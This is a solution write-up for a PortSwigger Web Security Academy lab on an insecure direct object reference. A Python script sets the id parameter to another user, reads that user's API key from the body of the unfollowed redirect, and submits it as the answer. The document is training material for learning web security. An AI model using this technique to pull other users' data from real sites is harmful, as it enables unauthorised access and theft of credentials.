# Lab: User ID controlled by request parameter with data leakage in redirect

Link to lab: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect

## Solution

```python
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup


url = 'https://0a6a0015034a7477c52219e300240091.web-security-academy.net/'



params = {
    'id': 'carlos',
}  

response = requests.get(
    url + 'my-account',
    params=params,
    verify=False,
    allow_redirects=False
)

pattern = r'\b\w{32}\b'
match = re.search(pattern, response.text).group()


data = {
    'answer': match,
}

response = requests.post(
    url + 'submitSolution',
    data=data,
    verify=False,
)
print(response.text)
```